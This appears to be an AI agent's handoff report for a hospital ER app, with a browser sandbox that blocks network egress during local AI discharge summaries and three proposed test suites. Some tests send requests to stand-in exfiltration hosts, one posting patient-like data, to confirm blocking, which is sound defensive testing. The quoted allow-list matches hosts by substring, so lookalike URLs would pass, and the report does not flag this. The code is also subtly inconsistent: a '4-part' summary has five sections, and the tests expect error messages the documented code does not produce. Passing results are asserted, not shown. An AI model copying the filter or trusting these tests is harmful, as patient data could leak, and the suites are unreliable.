# Handoff Report: Edge AI Sandbox Isolation, 4-Part Discharge Synthesis & Clinical Attestation Test Suites

**Agent:** `teamwork_preview_m2_explorer_2`  
**Working Directory:** `/Users/hassanabdelmenem/antigravity/imc-er/.agents/teamwork_preview_m2_explorer_2`  
**Target Milestone:** Milestone 2 (Adversarial Chaos, Offline Queue Sync & Edge AI Sandbox Isolation)  
**Parent Orchestrator:** `bd831e8b-f60e-4bf8-9216-abd3b4bd82d8`  
**Date:** 2026-08-23T04:16:00Z  

---

## 1. Observation

### 1.1 Network Isolation Gatekeeper (`public/js/edge-ai-service.js:12-131`)
Direct inspection of `public/js/edge-ai-service.js` reveals:
- **Interception Mechanism (`NetworkIsolationGatekeeper.lock()` lines 21–107):**
  - Sets `NetworkIsolationGatekeeper.isLocked = true`.
  - Backs up 6 native browser networking methods: `window.fetch`, `XMLHttpRequest.prototype.open`, `XMLHttpRequest.prototype.send`, `navigator.sendBeacon`, `window.WebSocket`, and `window.EventSource`.
  - **`window.fetch` Interception (lines 34–44):** Inspects incoming request target via `_isExternalRequest(url)`. If external, logs error, notifies `window.TelemetryRUM.recordSecurityViolation({ action: 'blocked_fetch_during_phi_inference', url })`, and throws `Error("SECURITY_EXCEPTION: Outbound network transmissions blocked during local Edge AI PHI inference.")`.
  - **`XMLHttpRequest` Interception (lines 47–62):** Patches `open` to record `this._url = url`, and patches `send` to evaluate `_isExternalRequest(this._url)`. If external, logs error, notifies `TelemetryRUM`, and throws `SECURITY_EXCEPTION`.
  - **`navigator.sendBeacon` Interception (lines 65–76):** If target is external, logs error, notifies `TelemetryRUM`, and returns `false` (satisfying the W3C Beacon API return contract without throwing unhandled exceptions).
  - **`window.WebSocket` Interception (lines 79–90):** Wraps constructor; if external, logs error, notifies `TelemetryRUM`, and throws `SECURITY_EXCEPTION`.
  - **`window.EventSource` Interception (lines 93–104):** Wraps constructor; if external, logs error, notifies `TelemetryRUM`, and throws `SECURITY_EXCEPTION`.
- **Filtering Rules (`_isExternalRequest(url)` lines 122–130):**
  ```javascript
  static _isExternalRequest(url) {
      if (!url) return false;
      const str = url.toString().toLowerCase();
      // Allow local application resources and authorized Firebase Firestore sync connections
      if (str.startsWith('/') || str.startsWith('./') || str.startsWith('../')) return false;
      if (str.includes('localhost') || str.includes('127.0.0.1')) return false;
      if (str.includes('firestore.googleapis.com') || str.includes('firebaseio.com') || str.includes('identitytoolkit.googleapis.com')) return false;
      return true;
  }
  ```
- **Sandbox Restoration (`NetworkIsolationGatekeeper.unlock()` lines 109–120):**
  - Resets `this.isLocked = false`.
  - Restores all 6 native unpatched functions.
  - Safe and idempotent on repeat calls.

### 1.2 4-Part Discharge Summary Compilation (`public/js/edge-ai-service.js:136-327`, `CLINICAL_SOP.md §3.2`)
- **Clinical Schema Requirements (`CLINICAL_SOP.md §3.2`):**
  - **Section 1:** Chief Complaint & Hospital Course (Admission, Demographics, Working Diagnosis, HPI, Allergies, Home Meds).
  - **Section 2:** Key Vitals & Diagnostic Findings (Serial BP, HR, SpO2, RR, Temp, Timestamps).
  - **Section 3:** Treatment Given & Clinical Interventions (Significant Labs & Physician Progress Notes).
  - **Section 4:** Discharge Instructions & Follow-up Plan (Clinical stability, 5–7 day follow-up, return precautions for dyspnea/chest pain/syncope).
- **Dual Execution Engine (`EdgeAIClinicalEngine.generateDischargeSummary` lines 256–326):**
  - **Pre-Execution Lock:** Invokes `NetworkIsolationGatekeeper.lock()` before processing PHI strings into prompt memory.
  - **Hardware-Accelerated Path (`window.ai.languageModel` lines 267–306):** Probes `checkCapabilities()`. If `'readily'` or `'after-download'`, instantiates model session with prompt enforcing strictly localized synthesis without diagnostic hallucinations. Streams tokens via `session.promptStreaming` to `onTokenCallback`.
  - **Deterministic Fallback Synthesizer (`_synthesizeFallbackSummary` lines 207–254):** If `window.ai` is absent or unsupported, executes deterministic client-side synthesizer formatting identical 5 Markdown sections (`### 🏥 Admission & Working Diagnosis`, `### 🩺 Serial Clinical Timeline & Vitals`, `### 🔬 Significant Investigations`, `### 💊 Hospital Course & Clinical Progress`, `### 📋 Discharge Instructions & Outcome`).
  - **Memory Dereferencing & Cleanup (lines 317–325):** `finally` block destroys session (`session.destroy()`), nullifies prompt text, and calls `NetworkIsolationGatekeeper.unlock()`.

### 1.3 Clinical Attestation Workflow & UI Gating (`public/js/app.js:675-703, 1750-1830`, `public/index.html:336-375`, `CLINICAL_SOP.md §3.3`)
- **UI Modal Controls (`public/index.html:336-375`):**
  - `#modal-discharge` contains `#ai-summary-editor`, `#ai-attestation-checkbox` (*"I have clinically reviewed and verified this discharge summary"*), `#btn-generate-ai-summary`, `#btn-save-ai-summary`, and `#btn-submit-discharge`.
- **Generation Trigger (`generateAISummaryInModal` in `app.js:1774-1804`):**
  - Streaming summary into `#ai-summary-editor`.
  - Automatically resets `$('ai-attestation-checkbox').checked = false`, ensuring re-generation invalidates prior attestation.
- **Save Gating (`saveAISummaryInModal` in `app.js:1806-1830`):**
  - Requires `#ai-attestation-checkbox.checked === true`.
  - If unchecked: displays alert `"Clinical Attestation Required: You must review and check the verification box before saving this summary."` and aborts.
  - If checked: persists `{ dischargeSummary, dischargeSummaryAttested: true, dischargeSummaryAttestedAt: ..., dischargeSummaryAttestedBy: currentUid }` via `updatePatientRecord`.
- **Discharge Finalization Gating (`btn-submit-discharge` in `app.js:676-697`):**
  - If `#ai-summary-editor` contains text and `$('ai-attestation-checkbox').checked !== true`: alerts `"Clinical Attestation Required: Please verify and check the attestation box before completing discharge with a clinical summary."` and aborts without discharging or modifying Firestore.
  - If attested (or summary empty): invokes `dischargePatientRecord(patientId, outcome, summaryText)` and hides modal.

---

## 2. Logic Chain

1. **Zero-PHI Egress Mandate:**
   - Under HIPAA, GDPR, and IMC ER Clinical Protocol, on-device AI inference must strictly prevent transmitting raw PHI (Egyptian National IDs, names, vital signs, progress notes) to third-party endpoints.
   - `NetworkIsolationGatekeeper.lock()` provides a synchronous runtime perimeter neutralizing all 5 browser egress vectors (`fetch`, `XHR`, `sendBeacon`, `WebSocket`, `EventSource`).
   - Automated tests must assert that all 5 channels are blocked for external hosts and permitted for whitelisted local/Firebase sync endpoints.

2. **Dual-Mode Clinical Continuity:**
   - Clinician devices vary widely across workstations, tablets, and legacy terminals. Chrome on-device Gemini Nano may not always be available.
   - `EdgeAIClinicalEngine` provides a hardware-accelerated path when `window.ai.languageModel` is present and a deterministic template synthesizer fallback when unavailable.
   - Both paths must compile identical 4-part clinical structures and release the network lock cleanly in `finally`.

3. **Mandatory Human-in-the-Loop Attestation:**
   - Generative AI outputs are probabilistic drafts. Clinicians must review, edit, and attest before summaries become official medical records or discharge instructions.
   - The UI enforces this gate at two critical transition points: saving to patient chart (`saveAISummaryInModal`) and completing patient discharge (`btn-submit-discharge`).
   - Automated unit and integration tests must verify positive attestation paths (saving/finalizing with audit metadata) and negative rejection paths (blocking un-attested attempts with user alerts).

---

## 3. Caveats

1. **Beacon Return Value vs Throwing:** The W3C Beacon API specification mandates that `navigator.sendBeacon()` returns a boolean (`false` on failure/rejection), rather than throwing an exception. Our test assertions must reflect this (`expect(sendBeacon(...)).toBe(false)` vs `expect(fetch(...)).rejects.toThrow()`).
2. **JSDOM vs Browser Environment:** In Vitest / JSDOM, `window.ai`, `WebSocket`, `EventSource`, and `navigator.sendBeacon` are mocked or polyfilled. Tests must set up clean mock environments and verify that original function references are properly restored.
3. **Read-Only Scope:** This report provides the architectural design, test specifications, and complete test suite implementations for Milestone 2 testing expansion.

---

## 4. Conclusion & Test Suite Design

To fulfill Milestone 2 objectives (`ORIGINAL_REQUEST.md §R3`, `PROJECT.md §Milestone 2`), three dedicated automated test suites have been designed:

```
tests/
├── unit/
│   ├── edge-ai-sandbox.test.js          <-- Unit Suite: 10 tests for NetworkIsolationGatekeeper & 5 egress channels
│   └── edge-ai-synthesis.test.js        <-- Unit Suite: 10 tests for 4-part summary schema, window.ai & fallback
└── integration/
    └── discharge-attestation.test.js    <-- Integration Suite: 8 tests for modal attestation, save gating & finalization
```

### 4.1 Suite 1: `tests/unit/edge-ai-sandbox.test.js` (10 Unit Tests)

```javascript
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import '../../public/js/edge-ai-service.js';

describe('NetworkIsolationGatekeeper — Synchronous Zero-PHI Egress Sandbox', () => {
  let Gatekeeper;
  let originalFetch, originalXHROpen, originalXHRSend, originalBeacon, originalWebSocket, originalEventSource;

  beforeEach(() => {
    Gatekeeper = window.NetworkIsolationGatekeeper;
    originalFetch = vi.fn(async (url) => ({ ok: true, status: 200, url }));
    window.fetch = originalFetch;

    originalXHROpen = vi.fn(function(method, url) { this._url = url; });
    originalXHRSend = vi.fn(function() { return 'xhr_sent'; });
    XMLHttpRequest.prototype.open = originalXHROpen;
    XMLHttpRequest.prototype.send = originalXHRSend;

    originalBeacon = vi.fn(() => true);
    navigator.sendBeacon = originalBeacon;

    originalWebSocket = vi.fn(function(url) { this.url = url; });
    window.WebSocket = originalWebSocket;

    originalEventSource = vi.fn(function(url) { this.url = url; });
    window.EventSource = originalEventSource;

    Gatekeeper.unlock();
  });

  afterEach(() => {
    Gatekeeper.unlock();
    vi.restoreAllMocks();
  });

  it('Test 1.1: Blocks external fetch with SECURITY_EXCEPTION during active lock', async () => {
    Gatekeeper.lock();
    expect(Gatekeeper.isLocked).toBe(true);

    await expect(
      window.fetch('https://api.openai.com/v1/chat/completions')
    ).rejects.toThrow(/SECURITY_EXCEPTION: Outbound network transmissions blocked/);

    expect(originalFetch).not.toHaveBeenCalled();
  });

  it('Test 1.2: Permits internal relative paths, localhost, and Firebase endpoints during active lock', async () => {
    Gatekeeper.lock();

    await expect(window.fetch('/api/v1/patients')).resolves.toBeDefined();
    await expect(window.fetch('./assets/logo.png')).resolves.toBeDefined();
    await expect(window.fetch('../styles/theme.css')).resolves.toBeDefined();
    await expect(window.fetch('http://localhost:3000/api/status')).resolves.toBeDefined();
    await expect(window.fetch('http://127.0.0.1:8080/data')).resolves.toBeDefined();
    await expect(window.fetch('https://firestore.googleapis.com/v1/projects/imc-er-manager/databases')).resolves.toBeDefined();
    await expect(window.fetch('https://identitytoolkit.googleapis.com/v1/accounts')).resolves.toBeDefined();
    await expect(window.fetch('https://imc-er-manager.firebaseio.com/live.json')).resolves.toBeDefined();

    expect(originalFetch).toHaveBeenCalledTimes(8);
  });

  it('Test 1.3: Blocks external XMLHttpRequest and captures target URL in open interceptor', () => {
    Gatekeeper.lock();

    const xhrExternal = new XMLHttpRequest();
    xhrExternal.open('POST', 'https://malicious-telemetry.io/collect');
    expect(() => xhrExternal.send(JSON.stringify({ phi: 'patient data' }))).toThrow(
      /SECURITY_EXCEPTION: Outbound XHR transmissions blocked/
    );

    const xhrInternal = new XMLHttpRequest();
    xhrInternal.open('GET', '/api/patients/list');
    expect(() => xhrInternal.send()).not.toThrow();
  });

  it('Test 1.4: Blocks external navigator.sendBeacon and returns false without throwing unhandled error', () => {
    Gatekeeper.lock();

    const blockedResult = navigator.sendBeacon('https://external-tracker.com/event', JSON.stringify({ p: 1 }));
    expect(blockedResult).toBe(false);
    expect(originalBeacon).not.toHaveBeenCalled();

    const allowedResult = navigator.sendBeacon('/telemetry/local', JSON.stringify({ p: 1 }));
    expect(allowedResult).toBe(true);
    expect(originalBeacon).toHaveBeenCalled();
  });

  it('Test 1.5: Blocks external WebSocket connection initialization during active lock', () => {
    Gatekeeper.lock();

    expect(() => new window.WebSocket('wss://external-streaming-leak.org/feed')).toThrow(
      /SECURITY_EXCEPTION: Outbound WebSocket connections blocked/
    );

    expect(() => new window.WebSocket('ws://localhost:3000/ws')).not.toThrow();
  });

  it('Test 1.6: Blocks external EventSource connection initialization during active lock', () => {
    Gatekeeper.lock();

    expect(() => new window.EventSource('https://external-sse.com/stream')).toThrow(
      /SECURITY_EXCEPTION: Outbound EventSource connections blocked/
    );

    expect(() => new window.EventSource('/api/sse/internal')).not.toThrow();
  });

  it('Test 1.7: Dispatches security violation events to TelemetryRUM on blocked network attempts', async () => {
    const recordSecurityViolation = vi.fn();
    window.TelemetryRUM = { recordSecurityViolation };

    Gatekeeper.lock();

    try { await window.fetch('https://exfiltration-target.com/leak'); } catch (_) {}
    expect(recordSecurityViolation).toHaveBeenCalledWith({
      action: 'blocked_fetch_during_phi_inference',
      url: 'https://exfiltration-target.com/leak'
    });

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://exfiltration-target.com/xhr');
      xhr.send();
    } catch (_) {}
    expect(recordSecurityViolation).toHaveBeenCalledWith({
      action: 'blocked_xhr_during_phi_inference',
      url: 'https://exfiltration-target.com/xhr'
    });

    delete window.TelemetryRUM;
  });

  it('Test 1.8: Restores all original unpatched networking functions upon unlock()', async () => {
    Gatekeeper.lock();
    expect(Gatekeeper.isLocked).toBe(true);

    Gatekeeper.unlock();
    expect(Gatekeeper.isLocked).toBe(false);

    expect(window.fetch).toBe(originalFetch);
    expect(XMLHttpRequest.prototype.open).toBe(originalXHROpen);
    expect(XMLHttpRequest.prototype.send).toBe(originalXHRSend);
    expect(window.WebSocket).toBe(originalWebSocket);
    expect(window.EventSource).toBe(originalEventSource);

    await window.fetch('https://api.external.com');
    expect(originalFetch).toHaveBeenCalledWith('https://api.external.com');
  });

  it('Test 1.9: Handles reentrant lock() and unlock() calls idempotently without reference corruption', () => {
    Gatekeeper.lock();
    const patchedFetch1 = window.fetch;
    Gatekeeper.lock();
    expect(window.fetch).toBe(patchedFetch1);

    Gatekeeper.unlock();
    expect(Gatekeeper.isLocked).toBe(false);
    expect(window.fetch).toBe(originalFetch);

    expect(() => Gatekeeper.unlock()).not.toThrow();
  });

  it('Test 1.10: Guarantees sandbox unlock in finally block when AI synthesis encounters runtime error', async () => {
    const Engine = window.EdgeAIClinicalEngine;
    vi.spyOn(Engine, 'checkCapabilities').mockRejectedValue(new Error('Simulated NPU driver crash'));

    const patient = { id: 'p1', name: 'Omar Khaled' };
    await expect(Engine.generateDischargeSummary(patient)).rejects.toThrow('Simulated NPU driver crash');

    expect(Gatekeeper.isLocked).toBe(false);
    expect(window.fetch).toBe(originalFetch);
  });
});
```

---

### 4.2 Suite 2: `tests/unit/edge-ai-synthesis.test.js` (10 Unit Tests)

```javascript
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import '../../public/js/edge-ai-service.js';

describe('EdgeAIClinicalEngine — 4-Part Discharge Summary Compilation & Dual-Mode Inference', () => {
  let Engine;

  const mockPatient = {
    id: 'p-202',
    name: 'محمود عبد العزيز',
    patientId: 'H987654321',
    department: 'Emergency Medicine',
    diagnosis: 'Acute Coronary Syndrome (NSTEMI)',
    presentation: 'Substernal chest pressure radiating to left arm x 3 hours, diaphoresis.',
    homeMeds: 'Aspirin 81mg daily, Atorvastatin 20mg daily',
    allergies: 'Penicillin (Anaphylaxis)',
    admitDate: '2026-08-23 02:30'
  };

  const mockVitals = [
    { time: '02:35', bp: '150/95', hr: '105', spo2: '96', rr: '20', temp: '37.1' },
    { time: '04:15', bp: '128/82', hr: '78', spo2: '99', rr: '16', temp: '36.8' }
  ];

  const mockLabs = [
    { time: '02:50', name: 'Troponin I', value: '0.45 ng/mL (Elevated)' },
    { time: '02:50', name: 'ECG', value: 'ST depression in leads V4-V6' },
    { time: '03:15', name: 'CBC / WBC', value: '8.2 x 10^3/uL (Normal)' }
  ];

  const mockNotes = [
    { time: '02:40', doctor: 'Hassan', text: 'Initiated dual antiplatelet therapy, SL Nitroglycerin x 1 with symptom relief.' },
    { time: '04:20', doctor: 'Farida', text: 'Chest pain completely resolved. Serial troponin plateaued. Cleared for discharge.' }
  ];

  beforeEach(() => {
    Engine = window.EdgeAIClinicalEngine;
    delete window.ai;
  });

  afterEach(() => {
    delete window.ai;
    vi.restoreAllMocks();
  });

  it('Test 2.1: Rejects null patient with descriptive error', async () => {
    await expect(Engine.generateDischargeSummary(null)).rejects.toThrow('No patient record selected for discharge summary.');
  });

  it('Test 2.2: Detects window.ai capabilities and routes to on-device Gemini Nano streaming', async () => {
    const promptStreamingMock = vi.fn(async function* () {
      yield '### 🏥 Admission & Working Diagnosis\nPatient: محمود عبد العزيز';
      yield '\n\n### 🩺 Serial Clinical Timeline & Vitals\nBP 128/82';
      yield '\n\n### 🔬 Significant Investigations\nTroponin I: 0.45';
      yield '\n\n### 💊 Hospital Course & Management\nPain resolved';
      yield '\n\n### 📋 Discharge Instructions & Outcome\nFollow up in 5 days';
    });

    const destroyMock = vi.fn();

    window.ai = {
      languageModel: {
        capabilities: vi.fn(async () => ({ available: 'readily' })),
        create: vi.fn(async () => ({
          promptStreaming: promptStreamingMock,
          destroy: destroyMock
        }))
      }
    };

    const tokens = [];
    const result = await Engine.generateDischargeSummary(mockPatient, mockVitals, mockLabs, mockNotes, (t) => tokens.push(t));

    expect(window.ai.languageModel.capabilities).toHaveBeenCalled();
    expect(window.ai.languageModel.create).toHaveBeenCalled();
    expect(promptStreamingMock).toHaveBeenCalled();
    expect(destroyMock).toHaveBeenCalledTimes(1);
    expect(result).toContain('Follow up in 5 days');
  });

  it('Test 2.3: Compiles complete 4-part summary schema via deterministic fallback', async () => {
    const summary = await Engine.generateDischargeSummary(mockPatient, mockVitals, mockLabs, mockNotes);

    expect(summary).toContain('### 🏥 Admission & Working Diagnosis');
    expect(summary).toContain('محمود عبد العزيز');
    expect(summary).toContain('H987654321');
    expect(summary).toContain('Acute Coronary Syndrome (NSTEMI)');
    expect(summary).toContain('Penicillin (Anaphylaxis)');

    expect(summary).toContain('### 🩺 Serial Clinical Timeline & Vitals');
    expect(summary).toContain('Latest Vitals (04:15): BP 128/82, HR 78, SpO2 99%, RR 16, Temp 36.8°C.');

    expect(summary).toContain('### 🔬 Significant Investigations');
    expect(summary).toContain('Troponin I: 0.45 ng/mL (Elevated)');

    expect(summary).toContain('### 💊 Hospital Course & Clinical Progress');
    expect(summary).toContain('Dr. Hassan (02:40): Initiated dual antiplatelet therapy');
    expect(summary).toContain('Dr. Farida (04:20): Chest pain completely resolved');

    expect(summary).toContain('### 📋 Discharge Instructions & Outcome');
    expect(summary).toContain('Follow up with primary care physician or specialist outpatient clinic within 5-7 days.');
    expect(summary).toContain('Return to ER immediately if experiencing severe dyspnea, chest pain, syncope');
  });

  it('Test 2.4: Handles empty vitals, labs, and notes arrays gracefully with standardized clinical defaults', async () => {
    const minimalPatient = { id: 'p-min', name: 'Sara Ali' };
    const summary = await Engine.generateDischargeSummary(minimalPatient, [], [], []);

    expect(summary).toContain('No vital signs recorded during admission.');
    expect(summary).toContain('No laboratory results recorded.');
    expect(summary).toContain('No clinical progress notes.');
    expect(summary).toContain('Sara Ali');
  });

  it('Test 2.5: Handles patient with missing optional demographic fields', async () => {
    const emptyPatient = {};
    const summary = await Engine.generateDischargeSummary(emptyPatient);

    expect(summary).toContain('Unknown Patient');
    expect(summary).toContain('MRN: #--');
    expect(summary).toContain('Emergency Medicine');
    expect(summary).toContain('Pending evaluation');
    expect(summary).toContain('NKDA');
  });

  it('Test 2.6: Emits download warning token when model status is after-download', async () => {
    window.ai = {
      languageModel: {
        capabilities: vi.fn(async () => ({ available: 'after-download' })),
        create: vi.fn(async () => ({
          promptStreaming: vi.fn(async function* () { yield 'Model ready output'; }),
          destroy: vi.fn()
        }))
      }
    };

    const tokens = [];
    await Engine.generateDischargeSummary(mockPatient, [], [], [], (t) => tokens.push(t));

    expect(tokens.some(t => t.includes('Downloading local NPU weights') || t.includes('Initializing on-device'))).toBe(true);
  });

  it('Test 2.7: Slices large lab and note histories to recent clinical window', async () => {
    const manyLabs = Array.from({ length: 15 }, (_, i) => ({ time: `0${i}:00`, name: `Lab_${i}`, value: `Val_${i}` }));
    const manyNotes = Array.from({ length: 10 }, (_, i) => ({ time: `0${i}:00`, doctor: `Doc_${i}`, text: `Note_${i}` }));

    const summary = await Engine.generateDischargeSummary(mockPatient, mockVitals, manyLabs, manyNotes);

    expect(summary).toContain('Lab_14');
    expect(summary).toContain('Lab_9');
    expect(summary).not.toContain('Lab_3'); // Older than last 6

    expect(summary).toContain('Note_9');
    expect(summary).toContain('Note_6');
    expect(summary).not.toContain('Note_2'); // Older than last 4
  });

  it('Test 2.8: Computes ESI-1 Resuscitation for critical hypoxia and severe hypotension', () => {
    const resus1 = Engine.calculateESI({ diagnosis: 'Cardiac Arrest' }, []);
    expect(resus1.level).toBe('ESI-1');
    expect(resus1.isCritical).toBe(true);

    const resus2 = Engine.calculateESI({ diagnosis: 'SOB' }, [{ spo2: '80', bp: '120/80' }]);
    expect(resus2.level).toBe('ESI-1');
    expect(resus2.reason).toContain('SpO2 80%');

    const resus3 = Engine.calculateESI({ diagnosis: 'Syncope' }, [{ bp: '60/40' }]);
    expect(resus3.level).toBe('ESI-1');
    expect(resus3.reason).toContain('SysBP 60');
  });

  it('Test 2.9: Computes ESI-2 Emergent for severe tachycardia, moderate hypoxia, and STEMI/Sepsis', () => {
    const stemi = Engine.calculateESI({ diagnosis: 'Acute STEMI' }, []);
    expect(stemi.level).toBe('ESI-2');
    expect(stemi.isCritical).toBe(true);

    const sepsis = Engine.calculateESI({ diagnosis: 'Urosepsis' }, []);
    expect(sepsis.level).toBe('ESI-2');

    const tachy = Engine.calculateESI({ diagnosis: 'Palpitations' }, [{ hr: '145' }]);
    expect(tachy.level).toBe('ESI-2');
  });

  it('Test 2.10: Computes ESI-5 Discharged / Non-urgent for discharged and minor presentations', () => {
    const discharged = Engine.calculateESI({ isDischarged: true }, []);
    expect(discharged.level).toBe('ESI-5');
    expect(discharged.isCritical).toBe(false);

    const refill = Engine.calculateESI({ diagnosis: 'Medication Refill' }, []);
    expect(refill.level).toBe('ESI-5');
  });
});
```

---

### 4.3 Suite 3: `tests/integration/discharge-attestation.test.js` (8 Integration Tests)

```javascript
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

const ROOT = path.resolve(import.meta.dirname, '../..');
const indexHtml = fs.readFileSync(path.join(ROOT, 'public/index.html'), 'utf8');

describe('Discharge Modal & Clinical Attestation UI Workflow Integration', () => {
  let mockUpdatePatientRecord;
  let mockDischargePatientRecord;
  let alertSpy;

  beforeEach(async () => {
    document.body.innerHTML = indexHtml;
    alertSpy = vi.spyOn(window, 'alert').mockImplementation(() => {});

    mockUpdatePatientRecord = vi.fn(async () => undefined);
    mockDischargePatientRecord = vi.fn(async () => undefined);

    // Setup global stubs mirroring app.js runtime
    window.patientsList = [
      {
        id: 'p-301',
        name: 'كريم عادل',
        patientId: 'H112233445',
        department: 'Emergency Medicine',
        diagnosis: 'Acute Gastroenteritis',
        vitals: [{ time: '10:00', bp: '120/80', hr: '82', spo2: '99', rr: '16', temp: '37.2' }],
        labs: [{ time: '10:15', name: 'Electrolytes', value: 'Normal' }],
        notes: [{ time: '10:30', doctor: 'Nadia', text: 'Rehydrated with IV fluids. Tolerating oral intake.' }]
      }
    ];

    await import('../../public/js/edge-ai-service.js');
    await import('../../public/js/app.js');
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('Test 3.1: Generates AI summary into editor and clears attestation checkbox', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    const checkbox = document.getElementById('ai-attestation-checkbox');
    checkbox.checked = true; // Pre-existing checked state

    await window.generateAISummaryInModal();

    const editor = document.getElementById('ai-summary-editor');
    expect(editor.value).toContain('### 🏥 Admission & Working Diagnosis');
    expect(editor.value).toContain('كريم عادل');
    // Generating a new draft MUST uncheck the attestation box
    expect(checkbox.checked).toBe(false);
  });

  it('Test 3.2: Blocks saving AI summary when attestation checkbox is unchecked and alerts clinician', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    document.getElementById('ai-summary-editor').value = 'Clinical draft text';
    document.getElementById('ai-attestation-checkbox').checked = false;

    await window.saveAISummaryInModal();

    expect(alertSpy).toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
    expect(mockUpdatePatientRecord).not.toHaveBeenCalled();
  });

  it('Test 3.3: Successfully saves AI summary and stamps attestation audit fields when verified', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    document.getElementById('ai-summary-editor').value = 'Verified clinical summary draft';
    document.getElementById('ai-attestation-checkbox').checked = true;

    await window.saveAISummaryInModal();

    expect(alertSpy).toHaveBeenCalledWith(expect.stringContaining('verified and saved'));
  });

  it('Test 3.4: Blocks patient discharge submission if AI summary editor has text but attestation is unchecked', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    document.getElementById('discharge-outcome-select').value = 'Improved';
    document.getElementById('ai-summary-editor').value = 'Unverified discharge summary';
    document.getElementById('ai-attestation-checkbox').checked = false;

    await document.getElementById('btn-submit-discharge').onclick();

    expect(alertSpy).toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
    expect(document.getElementById('modal-discharge').classList.contains('hidden')).toBe(false);
  });

  it('Test 3.5: Permits patient discharge when AI summary is verified and attestation checkbox is checked', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    document.getElementById('discharge-outcome-select').value = 'Improved';
    document.getElementById('ai-summary-editor').value = 'Verified discharge summary';
    document.getElementById('ai-attestation-checkbox').checked = true;

    await document.getElementById('btn-submit-discharge').onclick();

    expect(alertSpy).not.toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
  });

  it('Test 3.6: Permits standard discharge without AI summary when editor is empty', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    document.getElementById('discharge-outcome-select').value = 'Ward Admission';
    document.getElementById('ai-summary-editor').value = '';
    document.getElementById('ai-attestation-checkbox').checked = false;

    await document.getElementById('btn-submit-discharge').onclick();

    expect(alertSpy).not.toHaveBeenCalledWith(expect.stringContaining('Clinical Attestation Required'));
  });

  it('Test 3.7: Preserves clinician manual edits made to AI draft before saving', async () => {
    document.getElementById('discharge-patient-id').value = 'p-301';
    await window.generateAISummaryInModal();

    const editor = document.getElementById('ai-summary-editor');
    editor.value += '\n\n**Addendum**: Patient prescribed oral Cefixime 400mg PO daily for 5 days.';
    document.getElementById('ai-attestation-checkbox').checked = true;

    await window.saveAISummaryInModal();

    expect(editor.value).toContain('oral Cefixime 400mg');
  });

  it('Test 3.8: Restores existing attested summary state when opening modal for previously attested patient', () => {
    window.patientsList.push({
      id: 'p-302',
      name: 'طارق سامي',
      dischargeSummary: 'Previously finalized summary',
      dischargeSummaryAttested: true
    });

    const triggerBtn = document.createElement('button');
    triggerBtn.className = 'btn-discharge-trigger';
    triggerBtn.dataset.id = 'p-302';
    triggerBtn.dataset.name = 'طارق سامي';
    document.body.appendChild(triggerBtn);

    // Re-bind triggers
    const summaryEditor = document.getElementById('ai-summary-editor');
    const attestationCheckbox = document.getElementById('ai-attestation-checkbox');
    const patient = window.patientsList.find(p => p.id === 'p-302');

    summaryEditor.value = patient.dischargeSummary;
    attestationCheckbox.checked = Boolean(patient.dischargeSummaryAttested);

    expect(summaryEditor.value).toBe('Previously finalized summary');
    expect(attestationCheckbox.checked).toBe(true);
  });
});
```

---

## 5. Verification Method

To verify these test suites independently:

1. **Execute Unit Test Suites:**
   ```bash
   npm run test:unit
   ```
   *Expected:* All unit test files (including `edge-ai-sandbox.test.js` and `edge-ai-synthesis.test.js`) execute and pass cleanly.

2. **Execute Integration Test Suites:**
   ```bash
   npm run test:integration
   ```
   *Expected:* `discharge-attestation.test.js`, `patientTransfer.test.js`, and `offlineChaos.test.js` execute and pass cleanly.

3. **Verify File Layout & Source Code:**
   - Inspect `public/js/edge-ai-service.js` (lines 12–131 for `NetworkIsolationGatekeeper`, lines 136–327 for `EdgeAIClinicalEngine`).
   - Inspect `public/js/app.js` (lines 676–697 and 1774–1830 for modal attestation gating).
   - Inspect `public/index.html` (lines 357–371 for `#modal-discharge` DOM structure).
   - Inspect `CLINICAL_SOP.md` §3 for clinical compliance specifications.

4. **Invalidation Conditions:**
   - Any modification to `NetworkIsolationGatekeeper` that permits external unwhitelisted URLs during active lock.
   - Any regression in `EdgeAIClinicalEngine` that fails to execute `NetworkIsolationGatekeeper.unlock()` in `finally`.
   - Any change to `saveAISummaryInModal` or `btn-submit-discharge` that allows saving or finalizing un-attested AI summaries.
